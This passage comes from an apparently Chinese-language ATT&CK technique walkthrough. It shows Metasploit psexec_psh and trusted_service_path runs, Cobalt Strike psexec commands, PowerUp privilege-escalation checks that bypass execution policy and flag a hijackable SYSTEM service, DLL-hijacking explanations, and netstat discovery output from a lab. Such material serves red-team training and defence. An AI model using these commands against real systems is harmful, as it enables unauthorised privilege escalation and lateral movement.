<span class="pl-s"></span>
<span class="pl-s">Module options (exploit/windows/smb/psexec_psh):</span>
<span class="pl-s"></span>
<span class="pl-s">   Name                  Current Setting  Required  Description</span>
<span class="pl-s">   ----                  ---------------  --------  -----------</span>
<span class="pl-s">   DryRun                false            no        Prints the powershell command that would be used</span>
<span class="pl-s">   RHOSTS                                 yes       The target address range or CIDR identifier</span>
<span class="pl-s">   RPORT                 445              yes       The SMB service port (TCP)</span>
<span class="pl-s">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span>
<span class="pl-s">   SERVICE_DISPLAY_NAME                   no        The service display name</span>
<span class="pl-s">   SERVICE_NAME                           no        The service name</span>
<span class="pl-s">   SMBDomain             .                no        The Windows domain to use for authentication</span>
<span class="pl-s">   SMBPass                                no        The password for the specified username</span>
<span class="pl-s">   SMBUser                                no        The username to authenticate as</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">Exploit target:</span>
<span class="pl-s"></span>
<span class="pl-s">   Id  Name</span>
<span class="pl-s">   --  ----</span>
<span class="pl-s">   0   Automatic</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">msf5 exploit(windows/smb/psexec_psh) &gt; set rhosts 192.168.2.103</span>
<span class="pl-s">rhosts =&gt; 192.168.2.103</span>
<span class="pl-s">msf5 exploit(windows/smb/psexec_psh) &gt; exploit </span>
<span class="pl-s"></span></pre></div>
<h4><a id="user-content-cs下操作-14" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>psexec COMP_NAME {listener name} (via sc)</p>
<p>psexec_sh COMP_NAME {listener name} (via powershell)</p>
</blockquote>
<h2><a id="user-content-dll-search-order-hijackingdll劫持" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dll-search-order-hijackingdll%E5%8A%AB%E6%8C%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DLL Search Order Hijacking（DLL劫持）</h2>
<p>原理：</p>
<div class="highlight highlight-source-shell"><pre>Windows systems use a common method to look <span class="pl-k">for</span> required DLLs to load into a program. [1] Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence.

Adversaries may perform DLL preloading, also called binary planting attacks, [2] by placing a malicious DLL with the same name as an ambiguously specified DLL <span class="pl-k">in</span> a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. [3] Adversaries may use this behavior to cause the program to load a malicious DLL.

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. [4] [5] [6]

If a search order-vulnerable program is configured to run at a higher privilege level, <span class="pl-k">then</span> the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used <span class="pl-k">for</span> privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.

Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

通俗的来理解就是windows下的dll文件可以被替换或可以修改.manifest或.local重定向文件、目录或连接来直接修改程序加载DLL来达到权限提升或者其他的效果。</pre></div>
<h3><a id="user-content-check-for-common-privilege-escalation-methods常见的提权方法检测" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#check-for-common-privilege-escalation-methods%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check for common privilege escalation methods（常见的提权方法检测）</h3>
<h4><a id="user-content-terminal下操作-11" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>powershell.exe -epbypass PowerUp.ps1
Invoke-AllChecks</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> powershell -ExecutionPolicy Bypass  .<span class="pl-cce">\p</span>owerup.ps1 Invoke-AllChecks
</pre></div>
<h4><a id="user-content-msf下操作-10" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/local/trusted_service_path</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> show options 

Module options (exploit/windows/local/trusted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> session 1
session =<span class="pl-k">&gt;</span> 1
msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> exploit 

[-] Handler failed to <span class="pl-c1">bind</span> to 192.168.2.103:4444:-  -
[-] Handler failed to <span class="pl-c1">bind</span> to 0.0.0.0:4444:-  -
[<span class="pl-k">*</span>] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[<span class="pl-k">*</span>] Exploit completed, but no session was created.
</pre></div>
<h4><a id="user-content-cs下操作-15" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>powershell-import /path/to/PowerUp.ps1</p>
<p>powershell Invoke-AllChecks</p>
</blockquote>
<h2><a id="user-content-file-system-permissions-weakness文件系统权限不足" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#file-system-permissions-weakness%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>File System Permissions Weakness(文件系统权限不足)</h2>
<p>原理：</p>
<pre><code>Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

Services
Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

Executable Installers
Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. [1] [2]

简单来说就是可以替换文件、服务或者使用安装文件来获取权限

</code></pre>
<h3><a id="user-content-check-for-common-privilege-escalation-methods常见的提权方法检测-1" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#check-for-common-privilege-escalation-methods%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check for common privilege escalation methods（常见的提权方法检测）</h3>
<h4><a id="user-content-terminal下操作-12" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>powershell.exe -epbypass PowerUp.ps1</p>
<p>Invoke-AllChecks</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> Invoke-AllChecks

[<span class="pl-k">*</span>] Running Invoke-AllChecks
[+] Current user already has <span class="pl-k">local</span> administrative privileges<span class="pl-k">!</span>


[<span class="pl-k">*</span>] Checking <span class="pl-k">for</span> unquoted service paths...


ServiceName    <span class="pl-c1">:</span> VOneMgrSvcForNG
Path           <span class="pl-c1">:</span> C:<span class="pl-cce">\P</span>rogram Files (x86)<span class="pl-cce">\N</span>GVONE<span class="pl-cce">\C</span>lient<span class="pl-cce">\s</span>v_service.exe
ModifiablePath <span class="pl-c1">:</span> @{ModifiablePath=C:<span class="pl-cce">\;</span> IdentityReference=NT AUTHORITY<span class="pl-cce">\A</span>uthenticated Users<span class="pl-k">;</span> Permissions=AppendData/AddSu
                 bdirectory}
StartName      <span class="pl-c1">:</span> LocalSystem
AbuseFunction  <span class="pl-c1">:</span> Write-ServiceBinary -Name <span class="pl-s"><span class="pl-pds">'</span>VOneMgrSvcForNG<span class="pl-pds">'</span></span> -Path <span class="pl-k">&lt;</span>HijackPath<span class="pl-k">&gt;</span>
CanRestart     <span class="pl-c1">:</span> True

ServiceName    <span class="pl-c1">:</span> VOneMgrSvcForNG
Path           <span class="pl-c1">:</span> C:<span class="pl-cce">\P</span>rogram Files (x86)<span class="pl-cce">\N</span>GVONE<span class="pl-cce">\C</span>lient<span class="pl-cce">\s</span>v_service.exe
ModifiablePath <span class="pl-c1">:</span> @{ModifiablePath=C:<span class="pl-cce">\;</span> IdentityReference=NT AUTHORITY<span class="pl-cce">\A</span>uthenticated Users<span class="pl-k">;</span> Permissions=System.Object[]}
StartName      <span class="pl-c1">:</span> LocalSystem
AbuseFunction  <span class="pl-c1">:</span> Write-ServiceBinary -Name <span class="pl-s"><span class="pl-pds">'</span>VOneMgrSvcForNG<span class="pl-pds">'</span></span> -Path <span class="pl-k">&lt;</span>HijackPath<span class="pl-k">&gt;</span>
CanRestart     <span class="pl-c1">:</span> True

ServiceName    <span class="pl-c1">:</span> VOneMgrSvcForNG
Path           <span class="pl-c1">:</span> C:<span class="pl-cce">\P</span>rogram Files (x86)<span class="pl-cce">\N</span>GVONE<span class="pl-cce">\C</span>lient<span class="pl-cce">\s</span>v_service.exe
ModifiablePath <span class="pl-c1">:</span> @{ModifiablePath=C:<span class="pl-cce">\;</span> IdentityReference=BUILTIN<span class="pl-cce">\A</span>dministrators<span class="pl-k">;</span> Permissions=System.Object[]}
StartName      <span class="pl-c1">:</span> LocalSystem
AbuseFunction  <span class="pl-c1">:</span> Write-ServiceBinary -Name <span class="pl-s"><span class="pl-pds">'</span>VOneMgrSvcForNG<span class="pl-pds">'</span></span> -Path <span class="pl-k">&lt;</span>HijackPath<span class="pl-k">&gt;</span>
CanRestart     <span class="pl-c1">:</span> True

</pre></div>
<h4><a id="user-content-msf下操作-11" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/local/trusted_service_path</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.2.103:4444 
[<span class="pl-k">*</span>] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[<span class="pl-k">*</span>] Exploit completed, but no session was created.
msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> 
</pre></div>
<h2><a id="user-content-system-network-connections-discovery系统网络连接发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#system-network-connections-discovery%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>System Network Connections Discovery(系统网络连接发现)</h2>
<h3><a id="user-content-get-current-tcpip-connections获取当前tcpip连接" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-current-tcpip-connections%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8Dtcpip%E8%BF%9E%E6%8E%A5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get current TCP/IP connections（获取当前TCP/IP连接）</h3>
<h4><a id="user-content-terminal下操作-13" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>netstat -ano</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> netstat -ano

活动连接

  协议  本地地址          外部地址        状态           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       860
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:515            0.0.0.0:0              LISTENING       2988
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       376
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       64
  TCP    0.0.0.0:7443           0.0.0.0:0              LISTENING       5712
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1248
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1136
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2028
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2612
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       2784
  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING       632
  TCP    127.0.0.1:3443         0.0.0.0:0              LISTENING       3416
  TCP    127.0.0.1:35432        0.0.0.0:0              LISTENING       3456
  TCP    127.0.0.1:49677        127.0.0.1:49678        ESTABLISHED     3416
  TCP    127.0.0.1:49678        127.0.0.1:49677        ESTABLISHED     3416
  TCP    192.168.97.132:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.97.132:50215   40.90.189.152:443      ESTABLISHED     2740
  TCP    192.168.97.132:50231   185.199.109.153:443    TIME_WAIT       0
  TCP    192.168.97.132:50232   172.217.25.13:443      TIME_WAIT       0
  TCP    192.168.97.132:50233   203.208.39.227:443     TIME_WAIT       0
  TCP    192.168.97.132:50235   203.208.50.94:443      TIME_WAIT       0
  TCP    192.168.97.132:50236   216.58.197.99:443      TIME_WAIT       0
  TCP    192.168.97.132:50237   203.208.39.227:80      TIME_WAIT       0
  TCP    192.168.97.132:50238   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50241   203.208.43.77:443      TIME_WAIT       0
  TCP    192.168.97.132:50242   203.208.40.62:443      TIME_WAIT       0
  TCP    192.168.97.132:50244   3.224.99.7:443         TIME_WAIT       0
  TCP    192.168.97.132:50246   172.217.31.234:443     TIME_WAIT       0
  TCP    192.168.97.132:50247   54.186.190.8:443       TIME_WAIT       0
  TCP    192.168.97.132:50248   3.213.73.75:443        TIME_WAIT       0
  TCP    192.168.97.132:50249   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50250   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50251   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50252   123.129.254.12:80      TIME_WAIT       0
  TCP    192.168.97.132:50253   123.129.254.12:80      TIME_WAIT       0
  TCP    192.168.97.132:50256   216.58.221.238:443     TIME_WAIT       0
  TCP    192.168.97.132:50257   52.139.250.253:443     ESTABLISHED     2740
  TCP    [::]:135               [::]:0                 LISTENING       860
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:515               [::]:0                 LISTENING       2988
  TCP    [::]:3389              [::]:0                 LISTENING       376
  TCP    [::]:49664             [::]:0                 LISTENING       496
  TCP    [::]:49665             [::]:0                 LISTENING       1248
  TCP    [::]:49666             [::]:0                 LISTENING       1136
  TCP    [::]:49667             [::]:0                 LISTENING       2028
  TCP    [::]:49668             [::]:0                 LISTENING       2612
  TCP    [::]:49672             [::]:0                 LISTENING       604
  TCP    [::]:49673             [::]:0                 LISTENING       2784
  TCP    [::]:49683             [::]:0                 LISTENING       632
  TCP    [::1]:35432            [::]:0                 LISTENING       3456
  TCP    [::1]:35432            [::1]:50211            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50212            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50213            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50214            ESTABLISHED     3456
  TCP    [::1]:50211            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50212            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50213            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50214            [::1]:35432            ESTABLISHED     3416
  UDP    0.0.0.0:500            <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2772
  UDP    0.0.0.0:3389           <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    376
  UDP    0.0.0.0:4500           <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2772
  UDP    0.0.0.0:5050           <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    64
  UDP    0.0.0.0:5353           <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2204
  UDP    0.0.0.0:5355           <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2204
  UDP    0.0.0.0:58658          <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    5712
  UDP    127.0.0.1:1900         <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    127.0.0.1:4499         <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    236
  UDP    127.0.0.1:58657        <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    5712
  UDP    127.0.0.1:62902        <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    127.0.0.1:63142        <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    3260
  UDP    192.168.97.132:137     <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    4
  UDP    192.168.97.132:138     <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    4
  UDP    192.168.97.132:1900    <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    192.168.97.132:62901   <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    [::]:500               <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2772
  UDP    [::]:3389              <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    376
  UDP    [::]:4500              <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2772
  UDP    [::]:5353              <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2204
  UDP    [::]:5355              <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2204
  UDP    [::1]:1900             <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    [::1]:62900            <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
